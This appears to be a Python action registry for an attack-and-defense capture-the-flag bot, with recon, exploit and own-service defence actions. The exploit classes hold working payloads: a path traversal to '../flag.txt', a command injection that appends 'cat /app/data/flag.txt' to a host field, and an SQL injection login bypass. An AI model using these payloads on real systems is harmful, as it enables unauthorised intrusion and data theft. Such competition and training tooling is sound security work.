from __future__ import annotations

import hashlib
import secrets
import urllib.parse
import urllib.request
from dataclasses import dataclass
from http.cookiejar import CookieJar
from typing import Any, Protocol

from .runtime import (
    BotContext,
    _service_control_host,
    call_service_control,
    info,
    ok,
    warn,
)


@dataclass
class ActionResult:
    action_id: str
    target_team: int | None
    status: str
    flags: list[str]
    message: str = ""


class BotAction(Protocol):
    id: str
    label: str
    category: str
    scope: str
    description: str
    required_capabilities: frozenset
    parameters: dict[str, Any]
    required: list[str]

    def run(
        self,
        ctx: BotContext,
        target_team: int | None = None,
        arguments: dict[str, Any] | None = None,
    ) -> ActionResult: ...


class HealthCheckAction:
    id = "recon.health"
    label = "Health check"
    category = "Recon"
    scope = "target"
    required_capabilities: frozenset = frozenset()
    parameters = {"target_team": {"type": "integer", "minimum": 1}}
    required = ["target_team"]
    description = "GET /health before heavier actions."

    def run(
        self,
        ctx: BotContext,
        target_team: int | None = None,
        arguments: dict[str, Any] | None = None,
    ) -> ActionResult:
        del arguments
        assert target_team is not None
        body = ctx.get(f"{ctx.service_url(target_team)}/health")
        healthy = body is not None and "ok" in body.lower()
        return ActionResult(
            self.id,
            target_team,
            "ok" if healthy else "miss",
            [],
            "/health ok" if healthy else "/health failed",
        )


class PathTraversalAction:
    id = "exploit.path_traversal"
    label = "Path traversal"
    category = "Exploit"
    scope = "target"
    required_capabilities: frozenset = frozenset()
    parameters = {"target_team": {"type": "integer", "minimum": 1}}
    required = ["target_team"]
    description = "Read ../flag.txt through /export."

    def run(
        self,
        ctx: BotContext,
        target_team: int | None = None,
        arguments: dict[str, Any] | None = None,
    ) -> ActionResult:
        del arguments
        assert target_team is not None
        query = urllib.parse.urlencode({"file": "../flag.txt"})
        body = ctx.get(f"{ctx.service_url(target_team)}/export?{query}")
        flags = ctx.flag_re().findall(body or "")
        return ActionResult(self.id, target_team, "ok" if flags else "miss", flags)


class CommandInjectionAction:
    id = "exploit.cmdi"
    label = "Command injection"
    category = "Exploit"
    scope = "target"
    required_capabilities: frozenset = frozenset()
    parameters = {"target_team": {"type": "integer", "minimum": 1}}
    required = ["target_team"]
    description = "Inject a flag read through /admin/diagnostics."

    def run(
        self,
        ctx: BotContext,
        target_team: int | None = None,
        arguments: dict[str, Any] | None = None,
    ) -> ActionResult:
        del arguments
        assert target_team is not None
        body = ctx.post(
            f"{ctx.service_url(target_team)}/admin/diagnostics",
            {"host": "127.0.0.1; cat /app/data/flag.txt"},
        )
        flags = ctx.flag_re().findall(body or "")
        return ActionResult(self.id, target_team, "ok" if flags else "miss", flags)


class SqlInjectionAction:
    id = "exploit.sqli"
    label = "SQL injection"
    category = "Exploit"
    scope = "target"
    required_capabilities: frozenset = frozenset()
    parameters = {"target_team": {"type": "integer", "minimum": 1}}
    required = ["target_team"]
    description = "Bypass login as admin and read /notes."

    def run(
        self,
        ctx: BotContext,
        target_team: int | None = None,
        arguments: dict[str, Any] | None = None,
    ) -> ActionResult:
        del arguments
        assert target_team is not None
        base = ctx.service_url(target_team)
        cookie_jar = CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

        login = ctx.post(f"{base}/login", {"username": "admin' --", "password": "x"}, opener)
        if login is None:
            return ActionResult(self.id, target_team, "miss", [], "login unreachable")

        notes = ctx.get(f"{base}/notes", opener)
        flags = ctx.flag_re().findall(notes or "")
        return ActionResult(self.id, target_team, "ok" if flags else "miss", flags)


class PlantProbeAction:
    id = "probe.plant_endpoint"
    label = "Plant endpoint probe"
    category = "Probe"
    scope = "target"
    required_capabilities: frozenset = frozenset()
    parameters = {"target_team": {"type": "integer", "minimum": 1}}
    required = ["target_team"]
    description = "Probe /internal/plant with an intentionally invalid token."

    def run(
        self,
        ctx: BotContext,
        target_team: int | None = None,
        arguments: dict[str, Any] | None = None,
    ) -> ActionResult:
        del arguments
        assert target_team is not None
        fake_flag = f"FLAG{{{secrets.token_hex(16)}}}"
        code, body = ctx.post_json(
            f"{ctx.service_url(target_team)}/internal/plant",
            {"flag": fake_flag},
            {"X-Plant-Token": "wrongtoken"},
        )
        if code == 403:
            return ActionResult(self.id, target_team, "ok", [], "endpoint alive, token rejected")
        if code == 200:
            return ActionResult(self.id, target_team, "ok", [fake_flag], "token accepted")
        if code == 0:
            return ActionResult(self.id, target_team, "miss", [], "unreachable")
        return ActionResult(self.id, target_team, "miss", [], f"HTTP {code}: {body.strip()[:80]}")


class WatchdogAction:
    id = "maintain.watchdog"
    label = "Service watchdog"
    category = "Maintenance"
    scope = "self"
    required_capabilities: frozenset = frozenset({"service.control.local"})
    parameters: dict[str, Any] = {}
    required: list[str] = []
    description = "Restart the team app via the service-control API if it is unhealthy."

    def run(
        self,
        ctx: BotContext,
        target_team: int | None = None,
        arguments: dict[str, Any] | None = None,
    ) -> ActionResult:
        del target_team, arguments
        if ctx.my_team is None:
            return ActionResult(self.id, None, "skipped", [], "own team unknown")

        missing = self.required_capabilities - ctx.capabilities
        if missing:
            return ActionResult(
                self.id,
                ctx.my_team,
                "skipped",
                [],
                f"missing capabilities: {', '.join(sorted(missing))}",
            )

        host = _service_control_host(ctx.my_team)
        try:
            data = call_service_control(host, "GET", "/service/health")
        except Exception as exc:
            return ActionResult(
                self.id, ctx.my_team, "error", [], f"service-control unreachable: {exc}"
            )

        if data.get("running", False):
            return ActionResult(self.id, ctx.my_team, "ok", [], "service app is running")

        try:
            call_service_control(host, "POST", "/service/restart")
            return ActionResult(self.id, ctx.my_team, "ok", [], "service app restarted")
        except Exception as exc:
            return ActionResult(self.id, ctx.my_team, "error", [], f"restart failed: {exc}")


def _defense_call(
    ctx: BotContext,
    path: str,
    body: dict[str, object] | None = None,
    *,
    method: str = "POST",
) -> dict[str, Any]:
    if ctx.my_team is None:
        raise RuntimeError("own team unknown")
    host = _service_control_host(ctx.my_team)
    return call_service_control(host, method, path, body)


class AttackReconAction:
    id = "attack.recon"
    label = "A&D recon"
    category = "Attack"
    scope = "target"
    required_capabilities: frozenset = frozenset()
    parameters = {"target_team": {"type": "integer", "minimum": 1}}
    required = ["target_team"]
    description = "Probe an opponent service before attempting exploits."

    def run(
        self,
        ctx: BotContext,
        target_team: int | None = None,
        arguments: dict[str, Any] | None = None,
    ) -> ActionResult:
        del arguments
        result = HealthCheckAction().run(ctx, target_team)
        return ActionResult(
            self.id, result.target_team, result.status, result.flags, result.message
        )


class AttackExploitAction:
    id = "attack.exploit"
    label = "A&D exploit"
    category = "Exploit"
    scope = "target"
    required_capabilities: frozenset = frozenset()
    parameters = {
        "target_team": {"type": "integer", "minimum": 1},
        "vuln_type": {
            "type": "string",
            "enum": ["path_traversal", "command_injection", "sql_injection", "auto"],
        },
    }
    required = ["target_team"]
    description = "Run a selected or automatic registered exploit against an opponent."

    _VULN_TO_ACTION = {
        "path_traversal": PathTraversalAction(),
        "command_injection": CommandInjectionAction(),
        "cmdi": CommandInjectionAction(),
        "sql_injection": SqlInjectionAction(),
        "sqli": SqlInjectionAction(),
    }

    def run(
        self,
        ctx: BotContext,
        target_team: int | None = None,
        arguments: dict[str, Any] | None = None,
    ) -> ActionResult:
        assert target_team is not None
        vuln_type = str((arguments or {}).get("vuln_type", "auto"))
        actions = (
            [self._VULN_TO_ACTION[vuln_type]]
            if vuln_type in self._VULN_TO_ACTION
            else [PathTraversalAction(), CommandInjectionAction(), SqlInjectionAction()]
        )
        messages: list[str] = []
        for action in actions:
            result = action.run(ctx, target_team)
            messages.append(f"{action.id}:{result.status}")
            if result.flags:
                return ActionResult(
                    self.id,
                    target_team,
                    "ok",
                    result.flags,
                    f"{action.id} captured {len(result.flags)} flag(s)",
                )
        return ActionResult(self.id, target_team, "miss", [], ", ".join(messages))


class DefenseInspectFilesAction:
    id = "defend.inspect_files"
    label = "Inspect own source"
    category = "Defense"
    scope = "self"
    required_capabilities: frozenset = frozenset({"service.control.local"})
    parameters: dict[str, Any] = {}
    required: list[str] = []
    description = "List bounded source files available in the own service."

    def run(
        self,
        ctx: BotContext,
        target_team: int | None = None,
        arguments: dict[str, Any] | None = None,
    ) -> ActionResult:
        del target_team, arguments
        try:
            data = _defense_call(ctx, "/defense/files", method="GET")
            return ActionResult(
                self.id,
                ctx.my_team,
                "ok",
                [],
                f"{len(data.get('files', []))} files available",
            )
        except Exception as exc:
            return ActionResult(self.id, ctx.my_team, "error", [], str(exc)[:160])


class DefenseReadFileAction:
    id = "defend.read_file"
    label = "Read own source"
    category = "Defense"
    scope = "self"
    required_capabilities: frozenset = frozenset({"service.control.local"})
    parameters = {
        "path": {"type": "string"},
        "start_line": {"type": "integer", "minimum": 1},
        "end_line": {"type": "integer", "minimum": 1},
    }
    required = ["path"]
    description = "Read a bounded source range from the own service."

    def run(
        self,
        ctx: BotContext,
        target_team: int | None = None,
        arguments: dict[str, Any] | None = None,
    ) -> ActionResult:
        del target_team
        try:
            data = _defense_call(ctx, "/defense/read", arguments or {})
            return ActionResult(
                self.id,
                ctx.my_team,
                "ok",
                [],
                f"read {data.get('path', '')} ({len(str(data.get('content', '')))} chars)",
            )
        except Exception as exc:
            return ActionResult(self.id, ctx.my_team, "error", [], str(exc)[:160])


class DefenseSearchSourceAction:
    id = "defend.search_source"
    label = "Search own source"
    category = "Defense"
    scope = "self"
    required_capabilities: frozenset = frozenset({"service.control.local"})
    parameters = {"pattern": {"type": "string"}, "literal": {"type": "boolean"}}
    required = ["pattern"]
    description = "Search own source for a bounded literal or regex pattern."

    def run(
        self,
        ctx: BotContext,
        target_team: int | None = None,
        arguments: dict[str, Any] | None = None,
    ) -> ActionResult:
        del target_team
        try:
            data = _defense_call(ctx, "/defense/search", arguments or {})
            return ActionResult(
                self.id,
                ctx.my_team,
                "ok",
                [],
                f"{len(data.get('matches', []))} source matches",
            )
        except Exception as exc:
            return ActionResult(self.id, ctx.my_team, "error", [], str(exc)[:160])


class DefenseSnapshotAction:
    id = "defend.snapshot"
    label = "Snapshot own source"
    category = "Defense"
    scope = "self"
    required_capabilities: frozenset = frozenset({"service.control.local"})
    parameters: dict[str, Any] = {}
    required: list[str] = []
    description = "Create a rollback snapshot for the own service."

    def run(
        self,
        ctx: BotContext,
        target_team: int | None = None,
        arguments: dict[str, Any] | None = None,
    ) -> ActionResult:
        del target_team, arguments
        try:
            data = _defense_call(ctx, "/defense/snapshot")
            return ActionResult(
                self.id,
                ctx.my_team,
                "ok",
                [],
                f"snapshot {data.get('snapshot_id', '')}",
            )
        except Exception as exc:
            return ActionResult(self.id, ctx.my_team, "error", [], str(exc)[:160])


class DefenseApplyPatchAction:
    id = "defend.apply_patch"
    label = "Apply defensive patch"
    category = "Defense"
    scope = "self"
    required_capabilities: frozenset = frozenset({"service.control.local"})
    parameters = {
        "diff": {"type": "string"},
        "correlation_id": {"type": "string"},
        "vulnerability": {
            "type": "string",
            "enum": ["path_traversal", "command_injection", "sql_injection", "auto"],
        },
    }
    required: list[str] = []
    description = "Apply and validate a bounded patch transaction on the own service."

    def run(
        self,
        ctx: BotContext,
        target_team: int | None = None,
        arguments: dict[str, Any] | None = None,
    ) -> ActionResult:
        del target_team
        try:
            data = _defense_call(ctx, "/defense/patch", arguments or {})
            status = str(data.get("status", ""))
            ok_status = status == "committed"
            return ActionResult(
                self.id,
                ctx.my_team,
                "ok" if ok_status else "error",
                [],
                f"patch {status}: {data.get('error', '')}",
            )
        except Exception as exc:
            return ActionResult(self.id, ctx.my_team, "error", [], str(exc)[:160])


class DefenseRunCheckerAction:
    id = "defend.run_checker"
    label = "Run own checker"
    category = "Defense"
    scope = "self"
    required_capabilities: frozenset = frozenset({"service.control.local"})
    parameters: dict[str, Any] = {}
    required: list[str] = []
    description = "Run a bounded own-service checker/health validation."

    def run(
        self,
        ctx: BotContext,
        target_team: int | None = None,
        arguments: dict[str, Any] | None = None,
    ) -> ActionResult:
        del target_team, arguments
        try:
            data = _defense_call(ctx, "/defense/checker")
            return ActionResult(
                self.id,
                ctx.my_team,
                "ok" if data.get("passed") else "error",
                [],
                str(data.get("summary", ""))[:160],
            )
        except Exception as exc:
            return ActionResult(self.id, ctx.my_team, "error", [], str(exc)[:160])


class DefenseExploitRegressionAction:
    id = "defend.run_exploit_regression"
    label = "Run own exploit regression"
    category = "Defense"
    scope = "self"
    required_capabilities: frozenset = frozenset({"service.control.local"})
    parameters: dict[str, Any] = {}
    required: list[str] = []
    description = "Run reference exploits against own service; success means still vulnerable."

    def run(
        self,
        ctx: BotContext,
        target_team: int | None = None,
        arguments: dict[str, Any] | None = None,
    ) -> ActionResult:
        del target_team, arguments
        try:
            data = _defense_call(ctx, "/defense/exploit-regression")
            blocked = bool(data.get("exploit_blocked"))
            return ActionResult(
                self.id,
                ctx.my_team,
                "ok" if blocked else "miss",
                [],
                str(data.get("summary", ""))[:160],
            )
        except Exception as exc:
            return ActionResult(self.id, ctx.my_team, "error", [], str(exc)[:160])


class DefenseRollbackAction:
    id = "defend.rollback"
    label = "Rollback own patch"
    category = "Defense"
    scope = "self"
    required_capabilities: frozenset = frozenset({"service.control.local"})
    parameters = {"snapshot_id": {"type": "string"}}
    required: list[str] = []
    description = "Restore the most recent or selected own-service snapshot."

    def run(
        self,
        ctx: BotContext,
        target_team: int | None = None,
        arguments: dict[str, Any] | None = None,
    ) -> ActionResult:
        del target_team
        try:
            data = _defense_call(ctx, "/defense/rollback", arguments or {})
            return ActionResult(
                self.id,
                ctx.my_team,
                "ok" if data.get("restored") else "error",
                [],
                f"rollback {data.get('snapshot_id', '')}",
            )
        except Exception as exc:
            return ActionResult(self.id, ctx.my_team, "error", [], str(exc)[:160])


def _build_registry() -> dict[str, BotAction]:
    actions: list[BotAction] = [
        HealthCheckAction(),
        PathTraversalAction(),
        CommandInjectionAction(),
        SqlInjectionAction(),
        PlantProbeAction(),
        WatchdogAction(),
        AttackReconAction(),
        AttackExploitAction(),
        DefenseInspectFilesAction(),
        DefenseReadFileAction(),
        DefenseSearchSourceAction(),
        DefenseSnapshotAction(),
        DefenseApplyPatchAction(),
        DefenseRunCheckerAction(),
        DefenseExploitRegressionAction(),
        DefenseRollbackAction(),
    ]
    return {action.id: action for action in actions}


ACTION_REGISTRY = _build_registry()


def action_catalog() -> list[dict[str, object]]:
    return [
        {
            "id": action.id,
            "label": action.label,
            "category": action.category,
            "scope": action.scope,
            "description": action.description,
            "required_capabilities": sorted(getattr(action, "required_capabilities", [])),
            "parameters": dict(getattr(action, "parameters", {})),
            "required": list(getattr(action, "required", [])),
        }
        for action in ACTION_REGISTRY.values()
    ]


def log_action_result(result: ActionResult) -> None:
    prefix = result.action_id
    team = f"team{result.target_team}" if result.target_team is not None else "self"
    if result.flags:
        for flag in result.flags:
            fingerprint = hashlib.sha256(flag.encode("utf-8")).hexdigest()[:12]
            ok(f"{team} [{prefix}] flag captured ({fingerprint})")
        return

    message = result.message or "no flag found"
    if result.status == "ok":
        info(f"{team} [{prefix}] {message}")
    elif result.status == "skipped":
        warn(f"{team} [{prefix}] skipped: {message}")
    else:
        warn(f"{team} [{prefix}] {message}")
